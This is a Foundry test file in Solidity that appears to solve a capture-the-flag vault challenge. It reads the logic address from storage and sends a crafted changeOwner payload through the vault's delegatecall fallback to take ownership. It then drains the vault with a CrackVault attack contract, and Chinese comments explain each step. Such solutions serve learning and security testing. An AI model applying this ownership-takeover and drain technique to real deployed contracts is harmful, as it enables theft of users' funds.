// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "forge-std/console2.sol";
import "src/CrackVault.sol";


contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        CrackVault crack = new CrackVault(address(vault));

    bytes32 logic_addr = vm.load(address(vault), bytes32(uint256(1)));
    address _addr_logic = address(uint160(uint256(logic_addr)));
    assertEq(_addr_logic, address(logic));
    // 构造 payload，调用 VaultLogic.changeOwner(bytes32,address)
    bytes memory payload = abi.encodeWithSelector(
        VaultLogic.changeOwner.selector,
        logic_addr,
        address(crack)
    );
    // 调用 fallback → delegatecall → VaultLogic.changeOwner
    (bool success, ) = address(vault).call(payload);
    // Vault的owner已修改为crack
    assertEq(vault.owner(), address(crack));
    // 攻击者存钱并提走
    payable(address(crack)).transfer(0.01 ether);
    crack.before_crack();
    console2.log("before crack", address(vault).balance );
    assertEq(vault.canWithdraw(), true);
    crack.start_crack();
    console2.log("after crack", address(vault).balance );
    crack.withdraw_after_crack();
    console2.log("withdraw_after_crack balance", address(palyer).balance );
    // 8. 校验是否清空

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
